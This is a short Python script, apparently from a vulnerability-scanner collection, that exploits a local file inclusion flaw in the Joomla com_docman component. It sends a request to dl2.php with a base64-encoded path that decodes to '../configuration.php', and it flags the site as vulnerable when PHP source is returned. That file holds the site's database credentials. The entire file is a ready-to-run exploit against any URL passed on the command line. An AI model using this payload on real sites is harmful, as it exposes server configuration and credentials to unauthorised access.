#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: joomla组件com_docman本地文件包含
referer: https://www.exploit-db.com/exploits/37620
author: Lucifer
description: joomla组件com_docman 文件com_docman/dl2.php中参数file被base64解码后可造成文件包含漏洞。
'''
import sys
import requests
import warnings
def run(url):
        result = ['joomla组件com_docman本地文件包含','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/components/com_docman/dl2.php?archive=0&file=Li4vY29uZmlndXJhdGlvbi5waHA="
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.status_code == 200 and r"<?php" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    